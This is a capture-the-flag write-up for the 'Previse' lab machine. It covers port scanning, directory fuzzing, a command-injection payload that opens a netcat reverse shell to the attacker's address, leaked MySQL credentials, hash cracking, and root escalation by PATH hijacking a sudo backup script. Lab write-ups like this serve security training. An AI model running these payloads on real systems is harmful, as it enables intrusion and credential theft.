# PREVISE

### User Flag

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn
 10.10.11.104                                                                     
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

we now fuzz the webpage

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.104:80/FUZZ -recursion -e .php -v -t 200    

```

a lot of directories and files appear but most of them return code 302 so we bypass that using burp and manage to get into http://10.10.11.104/accounts.php and we create an account. now if we download site backup.zip and search a bit we can find user and password for mysql

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

also in logs.php we can find a key vulnerability, php is using the exec function with a parameter

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

so we now go to log data and again with burp change the request like this to create a reverse shell

```
delim=comma;nc 10.10.14.159 4445 -e /bin/bash
```

**note that we need to open our port 4445**

once we are in we can execute for a better interface
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

we are now inside the machine and can get into de database

```bash
www-data@previse:/var/www/html$ mysql -u root -p
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)
```

we get into the previse database and print it

```bash
mysql> select * from accounts
select * from accounts
    -> ;
;
+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  1 | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+----+---------------+------------------------------------+--------------------
```

now we copy the password hash and decrypt it via hashcat

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 500 hash2.txt rockyou.txt
```

we know the format (500) thanks to hashcat official webpage.
We found the password is **ilovecody112235!** so we connect via ssh an get the user Flag

### Root flag

if we look arround we'll find that in /opt/scripts there is a file called **access_backup.sh** which has a comment that says:

```
# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
```

so by looking and the code we know we can make a path manipulation attack

we create a file called date and gzip in any directory we want and fill it with

```bash
/bin/cat /root/root.txt > /tmp/a.txt
```

lastly we run the following command so we get the key in /tmp/a.txt

```bash
PATH=/tmp /usr/bin/sudo ./access_backup.sh
```
